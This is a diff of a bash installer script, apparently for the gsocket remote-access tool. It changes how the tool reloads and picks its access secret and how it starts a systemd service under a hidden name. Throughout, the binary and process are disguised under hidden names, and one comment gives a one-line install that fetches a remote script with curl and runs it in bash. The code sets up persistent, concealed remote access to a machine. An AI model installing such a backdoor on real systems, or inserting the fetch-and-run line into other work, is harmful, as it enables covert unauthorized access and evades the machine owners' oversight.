@@ -465,11 +465,19 @@ HOWTO_CONNECT_OUT()
 # Try to load a GS_SECRET
 gs_secret_reload()
 {
+	DEBUGF "secret_load(${1})"
+	[[ -n $GS_SECRET_FROM_FILE ]] && return
 	[[ ! -f "$1" ]] && return
+
 	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
 	local sec
 	sec=$(<"$1")
-	[[ ${#sec} -gt 10 ]] && GS_SECRET=$sec
+	[[ ${#sec} -lt 4 ]] && return
+	WARN "Using existing secret from '${1}'"
+	if [[ ${#sec} -lt 10 ]]; then
+		WARN "SECRET in '${1}' is very short! (${#sec})"
+	fi
+	GS_SECRET_FROM_FILE=$sec
 }
 
 gs_secret_write()
@@ -905,23 +913,24 @@ gs_start_systemd()
 	# HERE: It's systemd
 	if [[ -z "$IS_GS_RUNNING" ]]; then
 		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
-		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
-			IS_GS_RUNNING=1
-		else
+		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
 			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
 			exit_code 255
 		fi
-	fi
-	if [[ -n "$IS_SKIPPED" ]]; then
-		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
-	else
+		IS_GS_RUNNING=1
 		OK_OUT
+		return
 	fi
+
+	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 }
 
 gs_start()
 {
-	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
+	# If installed as systemd then try to start it
+	if [[ -n "$IS_SYSTEMD" ]]; then
+		gs_start_systemd
+	fi
 	[[ -n "$IS_GS_RUNNING" ]] && return
 
 	# Scenario to consider:
@@ -945,10 +954,13 @@ gs_start()
 			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 			unset IS_NEED_START
 		else
+			# HERE: sec.dat has been updated
 			OK_OUT
-			WARN "More than one ${BIN_HIDDEN_NAME} is running. You"
-			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
-			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
+			WARN "More than one ${BIN_HIDDEN_NAME} is running."
+			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "----> or terminate all     : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "----> or terminate the old one by logging in and typing:"
+			echo -e 1>&2 "      ${CM}kill -- -\$(ps -o ppid= -p \$(ps -o ppid= -p \$\$))${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -967,15 +979,22 @@ init_vars
 
 init_setup
 
-
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-[[ -z $GS_SECRET ]] && [[ -n "$X" ]] && GS_SECRET="$X"
+[[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ $UID -eq 0 ]]; then
-	[[ -z $GS_SECRET ]] && gs_secret_reload "$SYSTEMD_SEC_FILE" 
-	[[ -z $GS_SECRET ]] && gs_secret_reload "$RCLOCAL_SEC_FILE" 
+	gs_secret_reload "$SYSTEMD_SEC_FILE" 
+	gs_secret_reload "$RCLOCAL_SEC_FILE" 
 fi
-[[ -z $GS_SECRET ]] && gs_secret_reload "$USER_SEC_FILE"
+gs_secret_reload "$USER_SEC_FILE"
+
+if [[ -n $GS_SECRET_FROM_FILE ]]; then
+	GS_SECRET="${GS_SECRET_FROM_FILE}"
+else
+	GS_SECRET="${GS_SECRET_X}"
+fi
+
+DEBUGF "GS_SECRET=$GS_SECRET"
 
 try "$OSARCH"
 [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
